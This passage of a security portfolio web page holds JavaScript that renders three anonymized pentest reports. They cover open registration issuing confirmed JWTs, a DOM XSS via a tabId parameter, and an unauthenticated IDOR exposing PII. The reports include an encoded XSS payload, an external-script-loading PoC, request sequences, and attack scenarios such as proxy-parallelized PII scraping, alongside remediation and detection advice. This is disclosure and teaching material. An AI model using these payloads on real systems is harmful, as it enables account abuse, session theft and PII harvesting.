GET  https://&lt;api-host&gt;/api/admin/init
JS bundles: main.&lt;hash&gt;.js, runtime.&lt;hash&gt;.js
Modules: users-permissions, roles-permissions, upload, email, graphql
    </code></pre>

    <h2>Exploration</h2>
    <ul>
      <li>Unauthenticated POST returns JSON containing <code>jwt</code> and a confirmed <code>user</code> object.</li>
      <li><code>user.confirmed</code> appears <code>true</code> immediately after registration.</li>
      <li>Using the issued JWT to GET <code>/api/users/me</code> returns a full profile.</li>
      <li>Public admin bundles expose client logic references (e.g. <code>innerHTML</code>). </li>
    </ul>

    <h2>PoC — Controlled, conceptual</h2>
    <pre><code class="language-bash">
POST https://&lt;api-host&gt;/api/auth/local/register
Body:
{
  "username": "test-forensic",
  "email": "test+forensic@example.test",
  "password": "ChangeMe123!"
}
# Expected: 200 OK with jwt + user.confirmed = true
    </code></pre>

    <h2>Forensic artifacts & recommended collection</h2>
    <ul>
      <li>API gateway / access logs for registration attempts (timestamps, IPs).</li>
      <li>Application logs capturing token issuance and registration handler.</li>
      <li>Auth service logs for JWT metadata (id, exp, alg).</li>
      <li>Access logs for admin HTML/JS assets returned anonymously.</li>
    </ul>

    <h2>Impact assessment</h2>
    <ul>
      <li><strong>Automated account creation</strong>: easily scriptable mass registration.</li>
      <li><strong>Reconnaissance chaining</strong>: issued tokens enable further probing.</li>
      <li><strong>Service abuse</strong>: confirmed accounts bypass workflows.</li>
      <li><strong>Admin surface exposure</strong>: public bundles increase attack surface.</li>
    </ul>

    <h2>Recommended remediation</h2>
    <ol>
      <li>Do not issue full-scope JWTs or mark users confirmed before verification.</li>
      <li>Implement CAPTCHA + rate limiting on registration.</li>
      <li>Restrict admin assets to authenticated/internal access.</li>
      <li>Harden JWT processing (strong algos, short expiry, revocation).</li>
      <li>Audit client bundles to remove unsafe sinks (innerHTML, eval).</li>
    </ol>

    <blockquote>
      <p>Validation limited to a single synthetic account creation; no mass actions were performed.</p>
    </blockquote>
  </div>
  `;

  safeInjectReport('report-body', reportHtml);
}

  else if (id === 'xss') {
  const reportHtml = `
  <div class="post-content">
    <h1>Forensic Report — DOM XSS via GET Parameter on Authentication Flow</h1>

    <p><strong>Executive summary:</strong> During targeted mapping of the single-sign-on surface I discovered a reflected DOM-based XSS vulnerability in an unauthenticated authentication endpoint. The issue is caused by insufficient sanitization of the <code>tabId</code> GET parameter, which is reflected into the page and executed by the browser. A crafted link is sufficient to trigger arbitrary script execution without user interaction. This report is anonymized and written in a forensic penetration-tester style.</p>

    <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Responsible disclosure; all hosts and artefacts redacted.</div>

    <h2>Pre-engagement</h2>
    <p><strong>Scope:</strong> public SSO endpoints and frontend assets only. No social engineering or data exfiltration was performed.</p>
    <p><strong>Rules:</strong> non-destructive verification with automated browser tooling and benign payloads (alerts/banners only).</p>

    <h2>Information gathering</h2>
    <ol>
      <li>Crawled auth-related pages and captured client requests.</li>
      <li>Retrieved and inspected frontend bundles.</li>
      <li>Enumerated query parameters and traced their DOM/JS usage.</li>
    </ol>

    <h2>Mapping results (anonymized)</h2>
    <pre><code class="language-bash">
GET https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=&lt;value&gt;
Observed reflected parameters: tabId, schema, displayLang, errorMessage
    </code></pre>

    <h2>Vulnerable endpoint (example payload)</h2>
    <pre><code class="language-bash">
GET https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=%3Cimg%20src%3Dx%20onerror%3Dalert(1337)%3E
    </code></pre>
    <p>Visiting this crafted URL caused immediate JavaScript execution (alert) without authentication or interaction.</p>

    <h2>Proof of Concept — Controlled validation</h2>
    <pre><code class="language-bash">
https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=https%3A%2F%2F&lt;external-host&gt;%2Fchat.prod.js
    </code></pre>
    <p><strong>Hosted benign payload actions:</strong></p>
    <ul>
      <li>Triggered <code>alert()</code> to prove execution.</li>
      <li>Inserted full-screen DOM banner (overlay attack).</li>
      <li>Locked a DOM element to simulate denial-of-use.</li>
    </ul>

    <h2>Exploitability & Attack vector</h2>
    <ul>
      <li>No authentication or interaction required — crafted link = execution.</li>
      <li>Reflected parameters inserted into HTML/JS without encoding.</li>
      <li>External scripts can be hosted and invoked via the parameter.</li>
    </ul>

    <h2>Potential impact</h2>
    <ul>
      <li><strong>Session theft</strong> via injected scripts.</li>
      <li><strong>Phishing overlays</strong> to capture credentials.</li>
      <li><strong>Denial of service</strong> through persistent overlays or alert loops.</li>
      <li><strong>Reputation damage</strong> from crafted malicious links.</li>
    </ul>

    <h2>Forensic evidence (recommended for triage)</h2>
    <ul>
      <li>Playwright logs, screenshots, demo video (timestamped).</li>
      <li>HTTP logs for requests to <code>/user/auth/chooseschema</code>.</li>
      <li>Frontend bundle versions/hashes served at test time.</li>
      <li>DOM snapshots showing payload injection.</li>
      <li>Network HAR trace including external script load.</li>
    </ul>

    <h2>Detection & Monitoring guidance</h2>
    <ul>
      <li>WAF rules: block <code>&lt;script&gt;</code>, <code>onerror</code> in query params.</li>
      <li>Alert on suspicious encoded chars (<code>%3C</code>, <code>%3E</code>, <code>%22</code>).</li>
      <li>Bundle fingerprint monitoring for reflection logic.</li>
      <li>Synthetic monitoring for DOM integrity and response anomalies.</li>
    </ul>

    <h2>Remediation (prioritized)</h2>
    <ol>
      <li><strong>Sanitize & encode</strong> all user input before DOM insertion.</li>
      <li><strong>Allowlist</strong> valid values for parameters like <code>tabId</code>.</li>
      <li><strong>Avoid innerHTML</strong> with untrusted input — use safe DOM APIs.</li>
      <li><strong>Content Security Policy</strong> to restrict inline/third-party scripts.</li>
      <li><strong>Control static assets</strong> — pin origins and integrity hashes.</li>
    </ol>

    <h2>Safe validation PoC pattern</h2>
    <pre><code class="language-bash">
GET https://&lt;sso-host&gt;/user/auth/chooseschema?tabId=%3Cmarker%3E
# Confirm marker not executed as HTML/JS
    </code></pre>

    <blockquote>
      <p>All validation was performed with benign payloads, limited to visual proof (alerts, banners). No secrets were accessed or exfiltrated.</p>
    </blockquote>
  </div>
  `;

  safeInjectReport('report-body', reportHtml);
}

    else if (id === 'idor2') {
  const reportHtml = `
  <div class="post-content">
    <h1>Forensic Report — IDOR Leading to PII Exposure on Quote Resource</h1>

    <p><strong>Executive summary:</strong> During a targeted assessment of the public quote creation flow I discovered an Insecure Direct Object Reference (IDOR) that allows unauthenticated retrieval of quote records by UUID. A created quote returns a UUID which can subsequently be queried via a GET request without any ownership check or session binding. The endpoint returns personally identifiable information (PII) fields (email, date of birth, postcode, client IP). This report is anonymized and written in a forensic penetration-tester style.</p>

    <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Responsible disclosure; anonymized artifacts.</div>

    <h2>Pre-engagement</h2>
    <p><strong>Scope:</strong> public quote creation/retrieval endpoints and assets. No targeting of real users, only synthetic test data.</p>
    <p><strong>Rules:</strong> Non-destructive verification only. Identifiers redacted.</p>

    <h2>Information gathering</h2>
    <ol>
      <li>Manual interaction with the quote wizard to capture lifecycle.</li>
      <li>Passive inspection of browser network traces.</li>
      <li>Surface mapping: POST to create a quote, GET to retrieve by UUID.</li>
    </ol>

    <h2>Mapping results (anonymized)</h2>
    <pre><code class="language-bash">
POST https://&lt;api-host&gt;/api/quotes/
Response: 201 Created
Body: { "uuid": "&lt;uuid&gt;" }

GET https://&lt;api-host&gt;/api/quotes/&lt;uuid&gt;
Response: 200 OK -> returns PII fields:
- driver_email
- driver_date_of_birth
- driver_address_postcode
- ip_address
    </code></pre>

    <h2>Exploration & Verification</h2>
    <p>External unauthenticated GETs returned full quote payloads. No ownership or session checks were enforced.</p>

    <h2>Proof of Concept — Controlled</h2>
    <pre><code class="language-bash">
# 1) Create a quote (synthetic)
POST https://&lt;api-host&gt;/api/quotes/ -> { "uuid": "&lt;uuid&gt;" }

# 2) Retrieve without auth
GET https://&lt;api-host&gt;/api/quotes/&lt;uuid&gt;
# Response: 200 OK with PII (email, dob, postcode, ip)
    </code></pre>

    <h2>Automated validation & race tests</h2>
    <ul>
      <li>Batch creation + GET confirmed consistent behavior.</li>
      <li>Parallel GETs showed reliable responses under concurrency.</li>
    </ul>

    <h2>Forensic evidence</h2>
    <ul>
      <li>HTTP pairs for POST and unauthenticated GET.</li>
      <li>Browser HAR traces.</li>
      <li>Server access logs to <code>/api/quotes/&lt;uuid&gt;</code>.</li>
    </ul>

    <h2>Security analysis</h2>
    <ul>
      <li>Access control absent: possession of UUID = access.</li>
      <li>Reliance on UUID entropy is insufficient.</li>
      <li>Leak channels include referrers, logs, shared links.</li>
      <li>Constitutes GDPR/PII exposure risk.</li>
    </ul>

    <h2>Impact assessment</h2>
    <ul>
      <li><strong>PII disclosure:</strong> email, DOB, postcode, IP.</li>
      <li><strong>Data scraping:</strong> mass harvesting possible with UUID lists.</li>
      <li><strong>Phishing risk:</strong> PII usable for targeted fraud.</li>
      <li><strong>Regulatory exposure:</strong> GDPR obligations triggered.</li>
    </ul>

    <h2>Attack scenarios</h2>
    <ol>
      <li>Obtain UUIDs via leaks/logs.</li>
      <li>Script unauthenticated GETs to extract PII.</li>
      <li>Parallelize with proxies to evade throttling.</li>
      <li>Abuse harvested PII for fraud or phishing.</li>
    </ol>

    <h2>Recommended remediations</h2>
    <ol>
      <li><strong>Enforce access control</strong>: require auth & ownership checks.</li>
      <li><strong>Short-lived tokens</strong>: signed URLs bound to context.</li>
      <li><strong>Minimize PII</strong>: redact sensitive fields in public flows.</li>
      <li><strong>Audit & log</strong> anomalous access to quotes.</li>
      <li><strong>Rotate identifiers</strong> and avoid exposing persistent UUIDs.</li>
      <li><strong>Rate limiting</strong> + abuse controls on endpoints.</li>
    </ol>

    <h2>Detection & forensic guidance</h2>
    <ul>
      <li>Collect request logs for <code>/api/quotes/*</code>.</li>
      <li>Search for enumeration patterns and high-volume GETs.</li>
      <li>Monitor for UUID leak channels.</li>
      <li>Correlate POST creations with subsequent GETs.</li>
    </ul>

    <blockquote>
      <p>All testing used synthetic data and was strictly non-destructive. No production UUID enumeration performed.</p>
    </blockquote>

    <h2>Appendix — Safe PoC</h2>
    <pre><code class="language-bash">
POST https://&lt;api-host&gt;/api/quotes/ -> { "uuid": "&lt;uuid&gt;" }

GET https://&lt;api-host&gt;/api/quotes/&lt;uuid&gt;
# Expected: 401/403 or minimal metadata, not full PII
    </code></pre>
  </div>
  `;

  safeInjectReport('report-body', reportHtml);
}




  // fallback per gli altri report (placeholder)
   else {
    bodyEl.innerHTML = `
      <div style="max-width:900px;margin:0 auto;padding:20px;">
        <h3>${titleMap[id] || id}</h3>
        <p>Detailed content for <strong>${titleMap[id] || id}</strong> will be added here.</p>
      </div>
    `;
  }

  // scroll top
  window.scrollTo({ top: 0, behavior: 'smooth' });
  return false;
}



    // Initialize About text if About is default (not the case now, but safe)
    if(document.getElementById('about').classList.contains('active')){ particleEffect(); }
  </script>
  <script>
(function(){
  function startSpin() {
    const circle = document.querySelector('.avatar-circle');
    const symbol = document.querySelector('.avatar-symbol');
    if (!circle || !symbol) return;

    // restart animation reliably
    circle.classList.remove('spin-start');
    symbol.classList.remove('spin-start');
    // trigger reflow
    void circle.offsetWidth;

    circle.classList.add('spin-start');
    symbol.classList.add('spin-start');

    // cleanup
    function endCircle(){ circle.classList.remove('spin-start'); circle.removeEventListener('animationend', endCircle); }
    function endSymbol(){ symbol.classList.remove('spin-start'); symbol.removeEventListener('animationend', endSymbol); }
    circle.addEventListener('animationend', endCircle);
    symbol.addEventListener('animationend', endSymbol);
  }

  document.addEventListener('DOMContentLoaded', startSpin);
  window.addEventListener('pageshow', e => { if (e.persisted) startSpin(); });
})();
</script>

  
<script>
(function(){
  const sidebar = document.getElementById('sidebar');
  if (!sidebar) return;

  // Rimuovi eventuale toggle preesistente
  const prev = document.getElementById('menu-toggle');
  if (prev) prev.remove();

  // Create button
  const btn = document.createElement('button');
  btn.id = 'menu-toggle';
  btn.type = 'button';
  btn.setAttribute('aria-expanded', 'false');
  btn.setAttribute('aria-label', 'Toggle menu');
  btn.className = 'menu-toggle';
  // use a simple styled hamburger (CSS should style .hamburger)
  btn.innerHTML = '<span class="hamburger" aria-hidden="true"></span>';

  // Inserisci dopo avatar-wrapper, non come primo figlio
const avatar = sidebar.querySelector('.avatar-wrapper');
if (avatar) {
  sidebar.insertBefore(btn, avatar.nextSibling);
} else {
  sidebar.insertBefore(btn, sidebar.firstChild);
}


  // Utility: find sidebar list
  const sidebarList = sidebar.querySelector('ul');

  // Open/close logic
  function openSidebar() {
    sidebar.classList.add('open');
    btn.setAttribute('aria-expanded', 'true');
    if (sidebarList) {
      // rely on CSS to show it; also set inline fallback
      sidebarList.style.display = 'block';
      // focus first link for keyboard users
      const firstLink = sidebarList.querySelector('a, button');
      if (firstLink) firstLink.focus();
    }
    // close on outside click
    setTimeout(() => {
      document.addEventListener('click', outsideHandler);
    }, 10);
    document.addEventListener('keydown', escHandler);
  }

  function closeSidebar() {
    sidebar.classList.remove('open');
    btn.setAttribute('aria-expanded', 'false');
    if (sidebarList) sidebarList.style.display = 'none';
    document.removeEventListener('click', outsideHandler);
    document.removeEventListener('keydown', escHandler);
  }

  function toggleSidebar(e) {
    e.stopPropagation();
    if (sidebar.classList.contains('open')) closeSidebar();
    else openSidebar();
  }

  function outsideHandler(e) {
    if (!sidebar.contains(e.target)) closeSidebar();
  }

  function escHandler(e) {
    if (e.key === 'Escape' || e.key === 'Esc') closeSidebar();
  }

  // attach toggle
  btn.addEventListener('click', toggleSidebar);

  // ensure menu is hidden on load for small screens (defensive)
  if (window.matchMedia && window.matchMedia('(max-width:880px)').matches) {
    if (sidebarList) sidebarList.style.display = 'none';
  }

  // Keep layout consistent when resizing: close menu and restore display rules
  window.addEventListener('resize', () => {
    if (window.matchMedia('(min-width:881px)').matches) {
      // desktop: ensure nav visible, remove inline style
      if (sidebarList) sidebarList.style.display = '';
      sidebar.classList.remove('open');
      btn.setAttribute('aria-expanded', 'false');
    } else {
      // mobile: hide by default
      if (sidebarList && !sidebar.classList.contains('open')) sidebarList.style.display = 'none';
    }
  });
})();
</script>



</body>
</html>
